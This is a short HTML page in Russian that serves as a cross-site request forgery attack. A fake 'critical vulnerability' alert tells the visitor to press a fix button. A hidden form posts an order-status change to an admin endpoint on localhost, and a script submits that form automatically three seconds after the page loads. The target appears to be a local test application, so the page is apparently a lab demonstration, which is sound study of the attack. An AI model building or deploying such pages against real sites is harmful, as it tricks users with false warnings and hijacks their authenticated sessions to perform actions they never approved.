<!DOCTYPE html>
<html>
<head>
    <title>Срочное действие!</title>
</head>
<body>
    <h1>Внимание! Обнаружена критическая уязвимость в заказах!</h1>
    <p>Для устранения проблемы необходимо срочно нажать кнопку ниже.</p>
    <form action="http://localhost:8080/admin/orders/3/edit-status" method="post">
        <input type="hidden" name="status" value="Выполнен">
        <button type="submit">Устранить уязвимость</button>
    </form>

    <script>
        // Автоматически отправляем форму через 3 секунды после загрузки страницы
        setTimeout(function() {
            document.forms[0].submit();
        }, 3000);
    </script>
</body>
</html>
